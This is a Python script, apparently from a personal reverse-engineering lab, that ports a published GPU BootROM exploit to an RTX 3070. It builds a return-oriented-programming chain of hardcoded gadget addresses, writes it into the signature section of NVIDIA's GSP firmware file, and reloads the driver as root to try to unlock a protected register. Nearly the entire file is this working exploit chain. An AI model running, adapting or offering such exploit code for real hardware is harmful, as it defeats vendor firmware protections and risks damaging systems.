#!/usr/bin/env python3
"""cert20-plm-feat-test.py — the staged GA104 test: open the FEAT PLM only.

Adapted from d3dx9/cmpunlocker (GPL-2, the CMP 170HX / GA100 exploit by
the cmpunlocker authors, technique from Jon's published paper) for the
RTX 3070 (GA104, 10de:2488).

The test performs ONE PLM-open cycle on the FEAT register and verifies
by read-back. It never writes anything else, never touches the EEPROM,
and restores the stock GSP firmware at the end. Everything is volatile:
the worst case is a failed module load — a reboot returns to stock.

Run from a TTY (Ctrl+Alt+F3) or SSH — the display manager is stopped:
    sudo python3 cert20-plm-feat-test.py
"""
import mmap
import os
import struct
import sys
import time
from datetime import datetime

_LOG = "/run/media/cheurteen/Jeux SSD/Reverse Engenering/gpu-lab/day0/cert20-plm-feat-test.log"
_real_print = print
def print(*a, **k):
    _real_print(*a, **k)
    with open(_LOG, "a") as f:
        f.write(" ".join(str(x) for x in a) + "\n")

PCI_FULL = "0000:07:00.0"
GSP_PATH = "/lib/firmware/nvidia/610.57.04/gsp_tu10x.bin"
SIG_SECTION = b".fwsignature_ga100"
PLM_FEAT_ADDR = 0x00823804     # GA100 FEAT PLM — hypothesis #1 for GA104
PLM_FEAT_VALUE = 0xFFFFFFFF
RESOURCE0 = f"/sys/bus/pci/devices/{PCI_FULL}/resource0"

# --- the ROP payload (the cmpunlocker 24-dword chain, GA100 BROM gadgets) ---
ROP_FILL_DWORD = 0x000004a7
ROP_HEADER = 0x00000007
ROP_CANARY = 0xc0deca7e
ROP_OFFSETS = {
    "header": 0x1100, "canary_1": 0x5b40, "write_value": 0xf754,
    "canary_2": 0xf758, "gadget_1": 0xf75c, "write_addr": 0xf76c,
    "gadget_2": 0xf774, "zero_1": 0xf780, "gadget_3": 0xf788,
    "gadget_4": 0xf78c, "gadget_5": 0xf790, "canary_3": 0xf794,
    "gadget_6": 0xf798, "zero_2": 0xf79c, "canary_4": 0xf7a0,
    "gadget_7": 0xf7a4, "gadget_8": 0xf7b0, "gadget_9": 0xf7b8,
    "canary_5": 0xf7c4, "gadget_10": 0xf7c8, "gadget_11": 0xf7d8,
    "gadget_12": 0xf7e0, "gadget_13": 0xf7f4, "gadget_14": 0xf7f8,
}
ROP_GADGETS = {
    "gadget_1": 0x00000cbd, "gadget_2": 0x00001fbd, "gadget_3": 0x000010aa,
    "gadget_4": 0x0000815a, "gadget_5": 0x00008e18, "gadget_6": 0x0000815a,
    "gadget_7": 0x00001fbd, "gadget_8": 0x0000ffbc, "gadget_9": 0x0000582d,
    "gadget_10": 0x00000cbd, "gadget_11": 0x00000003, "gadget_12": 0x00001fbd,
    "gadget_13": 0x00000ccb, "gadget_14": 0x00007f2f,
}


def fill_payload(write_addr: int, write_value: int) -> bytes:
    payload_size = 0xF800
    payload = bytearray([ROP_FILL_DWORD & 0xFF] * payload_size)
    def w32(o, v):
        if 0 <= o <= len(payload) - 4:
            struct.pack_into("<I", payload, o, v & 0xFFFFFFFF)
    w32(ROP_OFFSETS["header"], ROP_HEADER)
    w32(ROP_OFFSETS["canary_1"], ROP_CANARY)
    w32(ROP_OFFSETS["write_value"], write_value)
    w32(ROP_OFFSETS["canary_2"], ROP_CANARY)
    w32(ROP_OFFSETS["gadget_1"], ROP_GADGETS["gadget_1"])
    w32(ROP_OFFSETS["write_addr"], write_addr)
    w32(ROP_OFFSETS["gadget_2"], ROP_GADGETS["gadget_2"])
    w32(ROP_OFFSETS["zero_1"], 0)
    w32(ROP_OFFSETS["gadget_3"], ROP_GADGETS["gadget_3"])
    w32(ROP_OFFSETS["gadget_4"], ROP_GADGETS["gadget_4"])
    w32(ROP_OFFSETS["gadget_5"], ROP_GADGETS["gadget_5"])
    w32(ROP_OFFSETS["canary_3"], ROP_CANARY)
    w32(ROP_OFFSETS["gadget_6"], ROP_GADGETS["gadget_6"])
    w32(ROP_OFFSETS["zero_2"], 0)
    w32(ROP_OFFSETS["canary_4"], ROP_CANARY)
    w32(ROP_OFFSETS["gadget_7"], ROP_GADGETS["gadget_7"])
    w32(ROP_OFFSETS["gadget_8"], ROP_GADGETS["gadget_8"])
    w32(ROP_OFFSETS["gadget_9"], ROP_GADGETS["gadget_9"])
    w32(ROP_OFFSETS["canary_5"], ROP_CANARY)
    w32(ROP_OFFSETS["gadget_10"], ROP_GADGETS["gadget_10"])
    w32(ROP_OFFSETS["gadget_11"], ROP_GADGETS["gadget_11"])
    w32(ROP_OFFSETS["gadget_12"], ROP_GADGETS["gadget_12"])
    w32(ROP_OFFSETS["gadget_13"], ROP_GADGETS["gadget_13"])
    w32(ROP_OFFSETS["gadget_14"], ROP_GADGETS["gadget_14"])
    return bytes(payload)


def patch_signature_section(gsp: bytearray, payload: bytes) -> None:
    """Port of the cmpunlocker patch_gsp: grow the file + the section when
    the payload exceeds the 4 KB on-disk section, keep the ELF valid."""
    e_shoff = struct.unpack_from("<Q", gsp, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", gsp, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", gsp, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", gsp, 0x3E)[0]
    shdrs = bytearray(gsp[e_shoff:e_shoff + e_shnum * e_shentsize])
    strtab_hdr = e_shstrndx * e_shentsize
    strtab_off = struct.unpack_from("<Q", shdrs, strtab_hdr + 0x18)[0]
    strtab_sz = struct.unpack_from("<Q", shdrs, strtab_hdr + 0x20)[0]
    strtab = bytes(gsp[strtab_off:strtab_off + strtab_sz])
    sig_idx = None
    for i in range(e_shnum):
        base = i * e_shentsize
        name_idx = struct.unpack_from("<I", shdrs, base)[0]
        end = strtab.find(b"\x00", name_idx)
        if strtab[name_idx:end] == SIG_SECTION:
            sig_idx = i
            sig_file_off = struct.unpack_from("<Q", shdrs, base + 0x18)[0]
            break
    if sig_idx is None:
        raise RuntimeError("section not found")
    orig_size = struct.unpack_from("<Q", shdrs, sig_idx * e_shentsize + 0x20)[0]
    if len(payload) > orig_size:
        if len(gsp) < sig_file_off + len(payload):
            gsp.extend(b"\x00" * (sig_file_off + len(payload) - len(gsp)))
        struct.pack_into("<Q", shdrs, sig_idx * e_shentsize + 0x20, len(payload))
    else:
        if len(payload) < orig_size:
            payload = payload + b"\x00" * (orig_size - len(payload))
    gsp[sig_file_off:sig_file_off + len(payload)] = payload[:len(payload)]
    # les section headers + strtab re-appendes en fin de fichier (l ELF reste valide)
    new_strtab_off = len(gsp)
    gsp.extend(strtab)
    struct.pack_into("<Q", shdrs, strtab_hdr + 0x18, new_strtab_off)
    new_shoff = len(gsp)
    gsp.extend(shdrs)
    struct.pack_into("<Q", gsp, 0x28, new_shoff)
    print(f"  .fwsignature_ga100 patched: {len(payload)} bytes @file 0x{sig_file_off:x} (section grew from {orig_size})")


def bar0_read32(offset: int):
    fd = os.open(RESOURCE0, os.O_RDWR | os.O_SYNC)
    try:
        mm = mmap.mmap(fd, 0x1000000)
        mm.seek(offset)
        val = struct.unpack("<I", mm.read(4))[0]
        mm.close()
        return val
    finally:
        os.close(fd)


def run(cmd, **kw):
    import subprocess
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def main():
    try:
        return _main()
    except Exception:
        import traceback
        print("EXCEPTION:")
        traceback.print_exc()
        with open(_LOG, "a") as f:
            f.write("EXCEPTION:\n" + traceback.format_exc() + "\n")
        return 2

def _main():
    if os.geteuid() != 0:
        print("ERROR: run with sudo (root required)")
        return 1
    print(f"=== CERT20 staged test {datetime.now().isoformat()} ===")
    print(f"=== CERT20 staged test: FEAT PLM open @0x{PLM_FEAT_ADDR:08x} ===")
    print(f"GPU: {PCI_FULL} (GA104), firmware: {GSP_PATH}")

    # baseline BEFORE any driver churn
    try:
        baseline = bar0_read32(PLM_FEAT_ADDR)
        print(f"[baseline] PLM @0x{PLM_FEAT_ADDR:08x} = 0x{baseline:08x}")
    except Exception as e:
        print(f"WARN: baseline read failed ({e}) — continuing (the read works after load)")

    gsp_backup = GSP_PATH + ".cert20.bak"
    if not os.path.exists(gsp_backup):
        import shutil
        shutil.copy2(GSP_PATH, gsp_backup)
        print(f"[backup] {gsp_backup}")
    gsp = bytearray(open(gsp_backup, "rb").read())

    print("[1/4] building the single-write ROP payload (FEAT PLM = 0xFFFFFFFF)")
    payload = fill_payload(PLM_FEAT_ADDR, PLM_FEAT_VALUE)
    patch_signature_section(gsp, payload)
    open(GSP_PATH, "wb").write(bytes(gsp))
    print("  firmware patched (the stock copy stays in the .bak)")

    print("[2/4] driver cycle (the BROM processes the patched signature)")
    run(["systemctl", "stop", "display-manager"])
    run(["killall", "-9", "Xorg", "Xwayland", "nvidia-persistenced"])
    for mod in ("nvidia_uvm", "nvidia_drm", "nvidia_modeset", "nvidia"):
        run(["modprobe", "-r", mod])
    time.sleep(2)
    r = run(["modprobe", "nvidia"])
    print(f"  modprobe nvidia: rc={r.returncode}")
    time.sleep(5)
    run(["bash", "-c", f"echo 1 > /sys/bus/pci/devices/{PCI_FULL}/reset"])
    time.sleep(3)

    print("[3/4] PLM read-back (the verdict)")
    try:
        after = bar0_read32(PLM_FEAT_ADDR)
        print(f"  PLM @0x{PLM_FEAT_ADDR:08x} = 0x{after:08x}")
        if after == PLM_FEAT_VALUE:
            print("  >>> FEAT PLM OPEN — the BootROM exploit works on GA104 <<<")
            verdict = "OPEN"
        elif after == baseline:
            print("  >>> PLM unchanged — the gadgets/addresses differ on GA104 <<<")
            verdict = "UNCHANGED"
        else:
            print(f"  >>> PLM CHANGED (0x{baseline:08x} -> 0x{after:08x}) — partial response <<<")
            verdict = "CHANGED"
    except Exception as e:
        print(f"  read failed: {e} — verdict: UNKNOWN")
        verdict = "UNKNOWN"

    print("[4/4] restoring the stock firmware + reload")
    import shutil
    shutil.copy2(gsp_backup, GSP_PATH)
    for mod in ("nvidia_uvm", "nvidia_drm", "nvidia_modeset", "nvidia"):
        run(["modprobe", "-r", mod])
    time.sleep(2)
    r = run(["modprobe", "nvidia"])
    print(f"  stock firmware restored, modprobe rc={r.returncode}")
    run(["systemctl", "start", "display-manager"])

    print(f"=== VERDICT: {verdict} — everything restored (the PLM state is volatile) ===")
    print("Report this verdict back to the session.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
